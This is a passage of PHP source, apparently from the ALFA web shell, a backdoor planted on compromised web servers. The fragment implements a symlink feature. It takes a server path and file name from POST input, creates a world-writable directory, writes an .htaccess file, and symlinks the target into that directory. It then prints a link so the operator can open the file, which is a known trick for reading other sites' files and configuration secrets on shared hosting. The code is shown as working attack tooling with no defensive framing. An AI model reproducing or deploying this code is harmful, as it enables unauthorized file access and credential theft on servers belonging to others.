<p><input type="submit" value=" " name="symlink" /></p></form></center>';
$path = $_POST['alfa5'];
$symname = $_POST['alfa6'];
$solevisible58 = $_POST['alfa7'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
alfacgihtaccess('sym', $sym_dir, $symname);
_alfa_symlink("$path","$sym_dir/$symname");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['alfa2']) && $_POST['alfa2']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_alfa_can_runCommand(false,false)){
@mkdir('alfasymlink',0777);
